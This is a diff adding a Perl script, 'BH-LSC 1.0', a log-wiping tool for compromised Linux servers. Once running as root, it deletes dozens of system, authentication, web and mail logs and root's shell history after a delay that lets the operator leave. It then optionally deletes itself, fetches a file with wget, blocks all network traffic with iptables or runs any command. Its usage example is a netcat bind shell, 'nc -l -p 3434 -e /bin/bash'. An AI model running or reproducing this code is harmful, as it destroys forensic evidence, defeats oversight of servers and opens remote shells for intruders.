@@ -1,0 +1,153 @@
+#!/usr/bin/perl
+#==============================================================#
+# BH-LSC 1.0 (BH-Linux Server Cleaner Version 1.0)
+# Coded By: Br4v3-H34r7
+# Contact: R00T[AT]Br4v3-H34r7[DOT]CoM
+# Website: Br4v3-H34r7.CoM | BH2H.CoM
+# License: GNU General Public License 3
+#==============================================================#
+# NOT FOR ILLEGAL USAGE - NOT FOR SCRIPT KIDDIES
+#==============================================================#
+# BEGIN THE CODE
+{
+	$uid = getpwuid($>); # Get User ID
+	if($uid eq "root") # If root
+	{
+		@logs = ("/var/log/lastlog", "/var/log/messages", "/var/log/warn", "/var/log/wtmp", "/var/log/poplog", "/var/log/qmail", "/var/log/smtpd", "/var/log/telnetd", "/var/log/secure", "/var/log/auth", "/var/log/auth.log", "/var/log/cups/access_log", "/var/log/cups/error_log", "/var/log/thttpd_log", "/var/log/spooler", "/var/spool/tmp", "/var/spool/errors", "/var/spool/locks", "/var/log/nctfpd.errs", "/var/log/acct", "/var/apache/log", "/var/apache/logs", "/usr/local/apache/log", "/usr/local/apache/logs", "/usr/local/www/logs/thttpd_log", "/var/log/news", "/var/log/news/news", "/var/log/news.all", "/var/log/news/news.all", "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice", "/var/log/news/suck.err", "/var/log/news/suck.notice", "/var/log/xferlog", "/var/log/proftpd/xferlog.legacy", "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log", "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log", "/var/log/httpsd/ssl.access_log", "/var/adm", "/var/run/utmp", "/etc/wtmp", "/etc/utmp", "/etc/mail/access", "/var/log/mail/info.log", "/var/log/mail/errors.log", "/var/log/httpd/*_log", "/var/log/ncftpd/misclog.txt", "/var/account/pacct", "/var/log/snort", "/var/log/bandwidth", "/var/log/explanations", "/var/log/syslog", "/var/log/user.log", "/var/log/daemons/info.log", "/var/log/daemons/warnings.log", "/var/log/daemons/errors.log", "/etc/httpd/logs/error_log", "/etc/httpd/logs/*_log", "/var/log/mysqld/mysqld.log"); # Logs Locations
+		@shells_history = ("/root/.ksh_history", "/root/.bash_history", "/root/.sh_history", "/root/.history", "/root/*_history", "/root/.login", "/root/.logout", "/root/.bash_logut", "/root/.Xauthority"); # Shells History Locations
+		if(@ARGV eq 0)
+		{
+			print "\n\t+--------------------------+\n";
+			print "\t|        BH-LSC 1.0        |\n";
+			print "\t|   Coded By Br4v3-H34r7   |\n";
+			print "\t| Br4v3-H34r7.CoM|BH2H.CoM |\n";
+			print "\t+--------------------------+\n\n";
+			
+			print "[*] FastMode Usage: perl $0 [Seconds] [Command(s)]\n";
+			print "[*] EXAMPLE: perl $0 30 \"nc -l -p 3434 -e /bin/bash\"\n\n";
+			
+			print "[+] Start Clean The Server? (Y/N): ";
+			chomp($Clean = <STDIN>); # Get The Answer
+			$LClean = "\L$Clean"; # Make User Input Lowercase Character
+				if($LClean eq "y") # Answer Yes
+				{
+					print "[+] Clean The Server After You Exit? (Y/N): ";
+					chomp($AfterExit = <STDIN>); # Get The Answer
+					$LAfterExit = "\L$AfterExit"; # Make User Input Lowercase Character
+					if($LAfterExit eq "y") # Answer Yes
+					{
+						print "[+] After How Many Time? (Seconds): ";
+						chomp($Seconds = <STDIN>); # Get The Seconds
+						
+						print "[+] Run Custom Command After Cleaning The Logs? (Y/N): ";
+						chomp($RunAfter = <STDIN>); # Get The Answer
+						$LRunAfter = "\L$RunAfter"; # Make User Input Lowercase Character
+							if ($LRunAfter eq "y") # Answer Yes
+							{
+								print "    (1) Make This Tool Remove It Self\n";
+								print "    (2) Delete Custom File From The Server\n";
+								print "    (3) Get File To The Server (Using \"wget\")\n";
+								print "    (4) Don't Allow Any Server Connections (Using \"iptables\" Firewall)\n";
+								print "    (5) Use Other Or Multi Commands (Use \";\" Between The Commands)\n";
+								
+								print "[+] Enter The Number Of Your Choice: ";
+								chomp($theanswer = <STDIN>); # Get The Answer
+									if($theanswer eq 1) # Make This Tool Remove It Self
+									{
+										use Cwd qw(realpath);
+										$toolpath = realpath($0); # Get The Tool Name
+										$command = ("rm -rf \"$toolpath\""); # Set After Exit Command
+									}	
+									elsif($theanswer eq 2) # Delete Custom File From The Server
+									{
+										print "[+] Enter File Location: ";
+										chomp($file = <STDIN>); # Get File Location
+										$command = ("rm -rf \"$file\""); # Set After Exit Command
+									}
+									elsif($theanswer eq 3) # Get File To The Server
+									{
+										print "[+] Enter File URL: ";
+										chomp($wget_url = <STDIN>); # Get File URL
+										print "[+] Enter Save Location: ";
+										chomp($wget_location = <STDIN>); # Get Save Location
+										$command = ("wget -O $wget_location $wget_url"); # Set After Exit Command
+									}
+									elsif($theanswer eq 4) # Don't Allow Any Server Connections
+									{
+										print "[+] DANGEROUS This Choice Will Make The Server Drop INPUT/OUTPUT/FORWARD Connections (Y/N): ";
+										chomp($answer5 = <STDIN>); # Get The Answer
+										$Lanswer5 = "\L$answer5"; # Make User Input Lowercase Character
+											if ($Lanswer5 eq "y") # Answer Yes
+											{
+												$command = ("/sbin/iptables -F;/sbin/iptables -P INPUT DROP;/sbin/iptables -P OUTPUT DROP;/sbin/iptables -P FORWARD DROP"); # Set After Exit Command
+											}
+											else # Error Input
+											{
+												print "[!] Error: Wrong Input... Skipped!\n";
+											}
+									}	
+									elsif($theanswer eq 5) # Use Other Or Multi Commands
+									{
+										print "[+] Enter The Command(s): ";
+										chomp($command = <STDIN>); # Set After Exit Command
+									}
+									else # Error Input
+									{
+										print "[!] Error: Wrong Input... Skipped!\n";
+									}	
+							}
+							elsif($LRunAfter eq "n") # Answer No
+							{
+								print "[-] Answer No, Run Custom Command After Cleaning The Logs... Skipped!\n";
+							}
+							else # Error Input
+							{
+								print "[!] Error: Wrong Input... Skipped!\n";
+							}
+							print "[+] You Have \"$Seconds\" Seconds To Exit The Server\n";
+							sleep $Seconds; # Wait For Some Seconds
+					}	
+					elsif($LAfterExit eq "n") # Answer No
+					{
+						print "[-] Answer No, Delete Server Logs After Exit... Skipped!\n";
+					}
+					else # Error Input
+					{
+						print "[!] Error: Wrong Input... Skipped!\n";
+					}
+						print "[+] Start Cleaning The Server...\n";
+						sleep 2; # Wait For 2 Seconds
+						
+						unlink @logs; # Deleting System Logs
+						print "[+] Server Logs Deleted Successfully\n";
+						sleep 2; # Wait For 2 Seconds
+						
+						unlink @shells_history; # Deleting Shells History
+						print "[+] Shells History Deleted Successfully\n\n";
+						
+						system $command; # Run The Command
+				}
+				elsif($LClean eq "n") # Answer No
+				{
+					print "[-] Answer No, Exit With Out Cleaning... Exit!\n";
+				}
+				else # Error Input
+				{
+					print "[!] Error: Wrong Input... Exit!\n";
+				}
+		}
+		else # FastMode
+		{
+			sleep $ARGV[0]; # Wait For Some Seconds
+			unlink @logs; # Deleting System Logs
+			unlink @shells_history; # Deleting Shells History
+			system $ARGV[1]; # Run The Command(s)
+		}
+	}
+	else # If Not root
+	{
+		print "[!] Error: You Must Be Server \"root\" To Use This Tool... Exit!\n";
+	}
+} 
+# END THE CODE
+#==============================================================#
